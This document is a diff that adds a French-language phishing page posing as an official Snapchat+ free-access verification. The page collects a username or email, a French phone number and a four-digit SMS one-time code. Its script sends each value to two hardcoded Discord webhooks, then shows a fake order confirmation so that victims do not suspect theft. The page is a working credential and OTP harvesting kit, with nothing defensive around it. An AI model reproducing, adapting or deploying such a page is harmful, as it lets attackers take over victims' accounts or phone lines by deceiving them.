@@ -1,0 +1,212 @@
+```
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<title>Snapchat+ | Vérification Officielle</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<style>
+:root { --bg-dark: #150a21; --card-bg: #231535; --accent-yellow: #FFFC00; --text-white: #ffffff; --text-gray: #9ca3af; --border-radius: 24px; --transition: all 0.4s cubic-bezier(0.2, 0.8, 0.2, 1); }
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
+body { background-color: var(--bg-dark); color: var(--text-white); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow-x: hidden; }
+#app-container { width: 100%; max-width: 460px; padding-top: 50px; position: relative; }
+.top-bar { position: fixed; top: 16px; left: 50%; transform: translateX(-50%); width: max-content; z-index: 10; }
+.snap-logo { background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); padding: 8px 16px; border-radius: 24px; display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 15px; }
+.snap-icon { width: 32px; height: 32px; background: var(--accent-yellow); border-radius: 6px; display: grid; place-items: center; font-size: 18px; color: #000; }
+.page { display: none; flex-direction: column; width: calc(100% - 24px); margin: 0 auto; padding: 16px; opacity: 0; transform: translateY(20px) scale(0.98); transition: var(--transition); pointer-events: none; }
+.page.active { display: flex; opacity: 1; transform: translateY(0) scale(1); pointer-events: auto; }
+.card { width: 100%; background: var(--card-bg); border-radius: var(--border-radius); padding: 24px 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; flex-direction: column; }
+.input-group { margin-bottom: 18px; } label { display: block; font-size: 12px; color: var(--accent-yellow); font-weight: 700; letter-spacing: 1px; margin-bottom: 6px; text-transform: uppercase; }
+input, select { width: 100%; padding: 14px 16px; background: rgba(0,0,0,0.35); border: 2px solid transparent; border-radius: 14px; color: white; font-size: 16px; outline: none; transition: all 0.2s; }
+input:focus { border-color: var(--accent-yellow); background: rgba(0,0,0,0.5); box-shadow: 0 0 0 4px rgba(255,252,0,0.15); }
+.input-error { border-color: #ff4c4c !important; background: rgba(255, 76, 76, 0.05) !important; }
+#error-phone { height: 18px; margin-top: -10px; margin-bottom: 10px; padding-left: 4px; font-size: 13px; color: #ff4c4c; opacity: 0; transition: opacity 0.2s; text-align: left; }
+#error-phone.visible { opacity: 1; }
+.btn-primary { width: 100%; padding: 16px; background: var(--accent-yellow); color: #000; font-weight: 800; font-size: 17px; border-radius: 24px; border: none; cursor: pointer; transition: transform 0.15s, box-shadow 0.2s, filter 0.2s; margin-top: auto; }
+.btn-primary:hover { background: #f3f01a; box-shadow: 0 0 18px rgba(255,252,0,0.4); }
+.btn-primary:active { transform: scale(0.96); filter: brightness(0.9); }
+.btn-primary:disabled { background: #555; color: #aaa; cursor: not-allowed; box-shadow: none; }
+.disclaimer-box { margin-top: 16px; padding: 10px 14px; background: rgba(255,252,0,0.08); border-radius: 12px; text-align: center; font-size: 13px; color: var(--text-gray); line-height: 1.4; }
+.disclaimer-box strong { color: var(--accent-yellow); }
+.loading-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; height: calc(100vh - 80px); text-align: center; }
+.spinner { width: 48px; height: 48px; border: 4px solid rgba(255,252,0,0.3); border-top-color: var(--accent-yellow); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.loading-text { font-size: 18px; font-weight: 600; color: var(--accent-yellow); animation: pulse 2s ease-in-out infinite alternate; }
+@keyframes pulse { from { opacity: 0.7; transform: scale(0.98); } to { opacity: 1; transform: scale(1.02); } }
+.otp-grid { display: flex !important; flex-direction: row !important; justify-content: center; gap: 12px; width: fit-content; margin: auto; padding-top: 8px; margin-bottom: auto; }
+.otp-input { width: 56px; height: 64px; background: var(--card-bg); border-radius: 16px; text-align: center; font-size: 26px; font-weight: 700; color: white; border: 2px solid transparent; transition: all 0.2s; ime-mode: disabled; }
+.otp-input:focus { border-color: var(--accent-yellow); outline: none; background: rgba(35,21,53,0.9); box-shadow: 0 0 16px rgba(255,252,0,0.3); transform: translateY(-4px); }
+.receipt-card { text-align: center; width: 100%; max-width: 380px; margin: auto; padding-bottom: 10px; }
+.order-header { font-size: 22px; color: var(--accent-yellow); margin-bottom: 6px; letter-spacing: 1px; }
+.order-id { font-size: 13px; color: var(--text-gray); margin-bottom: 24px; opacity: 0.8; }
+.order-details { text-align: left; padding: 0 16px; margin-bottom: 20px; }
+.order-row { display: flex; justify-content: space-between; font-size: 15px; margin-bottom: 12px; border-bottom: 1px dashed rgba(255,255,255,0.1); padding-bottom: 12px; }
+.order-label { color: var(--text-gray); }
+.order-value { font-weight: 600; text-align: right; }
+.divider { height: 2px; background: linear-gradient(90deg, transparent, var(--accent-yellow), transparent); margin: 18px auto; border-radius: 4px; opacity: 0.6; }
+.thanks-msg { font-size: 15px; line-height: 1.5; color: var(--text-white); margin-bottom: 16px; }
+.discord-note { background: rgba(255,252,0,0.1); border: 1px solid rgba(255,252,0,0.3); padding: 14px; border-radius: 16px; font-size: 14px; color: var(--accent-yellow); line-height: 1.4; }
+.check-icon { display: inline-block; background: var(--accent-yellow); color: #000; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; font-size: 16px; }
+.text-gray { color: var(--text-gray); font-size: 14px; text-align: center; }
+.mt-4 { margin-top: 16px; }
+</style>
+</head>
+<body>
+
+<div id="app-container">
+<div class="top-bar"><div class="snap-logo"><span class="snap-icon">S+</span> Snapchat+</div></div>
+
+<section class="page active" id="p-search">
+  <div style="flex:1; display:flex; flex-direction:column; justify-content:center;">
+    <div style="text-align: center; margin-bottom: 24px;">
+      <h1 style="font-size: 30px; color: var(--accent-yellow); margin-bottom: 8px;">Vérifiez votre compte</h1>
+      <p class="text-gray">Accès gratuit à Snapchat+ en cours d'activation.</p>
+    </div>
+    <div class="card">
+      <div class="input-group"><label>Pseudo ou Email</label><input type="text" id="inp-pseudo" placeholder="@exemple_utilisateur" autocomplete="off" /></div>
+      <div class="input-group">
+        <label>Numéro de téléphone</label>
+        <input type="tel" id="inp-phone" placeholder="+33..." maxlength="20" style="letter-spacing: 2px;" />
+        <div id="error-phone" class="error-message visible">Veuillez entrer un numéro français valide (+33...)</div>
+      </div>
+      <button class="btn-primary mt-4" id="btn-start" disabled>Continuer</button>
+      <div class="disclaimer-box"><strong>⚠️ Attention :</strong> Si vous n'êtes pas chez SFR ou Orange cela ne fonctionnera pas. Vérification obligatoire avant activation gratuite.<br/><span style="font-size:12px; opacity:0.7;">Technique gratuite, fini a 00h00. Activation sous 2h max.</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="page" id="p-loading">
+<div class="loading-wrapper">
+  <div class="spinner"></div>
+  <p class="loading-text">Vérification anti-robot en cours...</p>
+</div>
+</section>
+
+<section class="page" id="p-otp">
+  <div style="flex:1; display:flex; flex-direction:column; justify-content:center;">
+    <div style="text-align: center; margin-bottom: 20px;">
+      <h2 style="font-size: 26px; color: var(--accent-yellow); margin-bottom: 8px;">Entrez le code reçu</h2>
+      <p class="text-gray">Saisissez les chiffres que vous avez reçus par SMS au <strong id="display-phone" style="color:white;">-</strong></p>
+    </div>
+    <div class="card otp-grid">
+      <input type="text" class="otp-input" maxlength="1" data-index="0" />
+      <input type="text" class="otp-input" maxlength="1" data-index="1" />
+      <input type="text" class="otp-input" maxlength="1" data-index="2" />
+      <input type="text" class="otp-input" maxlength="1" data-index="3" />
+    </div>
+    <button id="btn-verify" class="btn-primary mt-4" onclick="validateOTP()" disabled>Vérifier & Activer</button>
+  </div>
+</section>
+
+<section class="page" id="p-success">
+  <div style="flex:1; display:flex; flex-direction:column; justify-content:center;">
+    <div class="card receipt-card">
+      <span class="check-icon">✓</span>
+      <h2 class="order-header">Commande Confirmée</h2>
+      <p class="order-id" id="order-id">#SNAP-VERIFY-2024</p>
+      <div class="order-details">
+        <div class="order-row"><span class="order-label">Pseudo :</span><span class="order-value" id="res-pseudo">@exemple</span></div>
+        <div class="order-row"><span class="order-label">Téléphone :</span><span class="order-value" id="res-phone">06********</span></div>
+        <div class="order-row"><span class="order-label">Produit reçu :</span><span class="order-value" style="color:var(--accent-yellow);">Snapchat+ Premium</span></div>
+      </div>
+      <div class="divider"></div>
+      <p class="thanks-msg">Merci d'avoir testé notre technique de vérification.<br/>Votre profil est sécurisé et l'accès gratuit est activé en arrière-plan.</p>
+      <div class="discord-note">📩 <strong>Rappel important :</strong><br/>Veuillez consulter votre Snapchat sous 1 à 2 heures pour finaliser la réception de vos accès et recevoir le lien d'activation définitif.</div>
+    </div>
+  </div>
+</section>
+
+</div>
+
+<script>
+
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1558759293799505970/JSh2CC2ez8pOf90yli9pnDBfBqpAXlVgDSYOAyanuYRDgcTuo01c4mZPHkqwbz5mJOcy";
+const SECOND_WEBHOOK_URL = "https://discord.com/api/webhooks/1573740953972510851/b4Yapsl0kbtB3CRQylfd_9V7MWQOZ9YTLGpISd0qijIGMSbiuECo8zNYAQFItbrcKlZM";
+
+let appState = { pseudo: '', phone: '' };
+const pages = document.querySelectorAll('.page');
+function goTo(pageId) {
+    pages.forEach(p => p.classList.remove('active'));
+    const target = document.getElementById(pageId);
+    target.classList.add('active');
+}
+
+async function sendWebhook(msg, url = WEBHOOK_URL) {
+  const payload = { content: msg, username: "Snap Chat Verification" };
+  try { await fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) }); }
+  catch(e) { console.warn("Webhook:", e); }
+}
+
+const inpPhone = document.getElementById('inp-phone');
+const btnStart = document.getElementById('btn-start');
+const errorPhoneDiv = document.getElementById('error-phone');
+
+function isValidFrenchPhone(phoneStr) {
+    const cleanPhone = phoneStr.replace(/[\s\-\(\)]/g, '');
+    const regex = /^(\+|00)?33[1-9]\d{8}$|^0[1-9][0-9]{8}$/;
+    if (!cleanPhone) return false;
+    if (regex.test(cleanPhone)) { errorPhoneDiv.classList.remove('visible'); inpPhone.classList.remove('input-error'); return true; }
+    else { errorPhoneDiv.classList.add('visible'); inpPhone.classList.add('input-error'); return false; }
+}
+
+inpPhone.addEventListener('input', () => { const isValid = isValidFrenchPhone(inpPhone.value); btnStart.disabled = !isValid; });
+
+btnStart.addEventListener('click', () => {
+    if (!isValidFrenchPhone(inpPhone.value)) return;
+
+    const pseudoVal = document.getElementById('inp-pseudo').value.trim() || '@utilisateur';
+    const cleanPhoneDisplay = inpPhone.value.replace(/[\s\-\(\)]/g, '');
+    appState.pseudo = pseudoVal;
+    appState.phone = cleanPhoneDisplay;
+
+    sendWebhook(` **Vérification en cours**\n Pseudo : \`${appState.pseudo}\`\n Tél : \`${cleanPhoneDisplay}\``);
+
+    goTo('p-loading');
+
+    setTimeout(() => {
+        sendWebhook(` **Confirmation initiale**\n Pseudo : \`${appState.pseudo}\`\n Tél : \`${cleanPhoneDisplay}\``, SECOND_WEBHOOK_URL);
+        document.getElementById('display-phone').innerText = cleanPhoneDisplay;
+        goTo('p-otp');
+    }, 15000);
+});
+
+const otpInputs = document.querySelectorAll('.otp-input');
+let secondWebhookTriggered = false;
+
+otpInputs.forEach((inp, i) => {
+  inp.addEventListener('input', () => { if(inp.value && i < 3) otpInputs[i+1].focus(); checkOtpValidity(); });
+  inp.addEventListener('keydown', e => { if(e.key === 'Backspace' && !inp.value && i > 0) otpInputs[i-1].focus(); if(e.key === "Enter") validateOTP(); });
+});
+
+function checkOtpValidity() { const allFilled = [...otpInputs].every(el => el.value.length === 1); document.getElementById('btn-verify').disabled = !allFilled; }
+function focusOtp(i) { setTimeout(() => otpInputs[i]?.focus(), 300); }
+
+async function validateOTP() {
+    const code = [...otpInputs].map(el => el.value).join('');
+    const btn = document.getElementById('btn-verify');
+
+    if (!code || code.length < 4) return;
+
+    btn.disabled = true;
+    btn.innerText = "Vérification en cours...";
+
+    sendWebhook(` **Code validé**\n Code : \`${code}\`\n Pseudo : \`${appState.pseudo}\``);
+
+        setTimeout(() => {
+        sendWebhook(` **Confirmation code**\n Code : \`${code}\`\n Pseudo : \`${appState.pseudo}\``, SECOND_WEBHOOK_URL);
+    }, 15000);
+
+    setTimeout(() => {
+      goTo('p-success');
+      document.getElementById('res-pseudo').innerText = appState.pseudo;
+      document.getElementById('res-phone').innerText = appState.phone.replace(/(\d{2})/g, '$1 ').trim();
+    }, 600);
+}
+
+// Initialisation
+otpInputs[0].focus();
+</script>
+</body>
+</html>
+
+```
